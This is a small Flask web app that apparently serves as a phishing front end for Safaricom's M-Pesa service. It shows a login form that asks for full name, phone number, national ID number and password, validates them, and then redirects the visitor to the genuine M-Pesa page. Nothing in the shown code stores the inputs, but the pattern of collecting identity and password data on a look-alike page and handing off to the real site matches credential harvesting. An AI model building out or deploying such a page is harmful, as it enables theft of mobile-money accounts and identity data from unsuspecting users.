from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    full_name = (request.form.get('fullName') or '').strip()
    phone = (request.form.get('phone') or '').strip()
    id_number = (request.form.get('idNumber') or '').strip()
    password = (request.form.get('password') or '').strip()

    if not full_name or not phone or not id_number or not password:
        return render_template('login.html', error='Please fill in all required fields.')

    if not phone.isdigit() or len(phone) < 10 or len(phone) > 13:
        return render_template('login.html', error='Please enter a valid phone number with digits only.')

    if len(password) < 6:
        return render_template('login.html', error='Password must be at least 6 characters long.')

    return redirect('https://www.safaricom.co.ke/personal/m-pesa')

if __name__ == '__main__':
    app.run(debug=True)
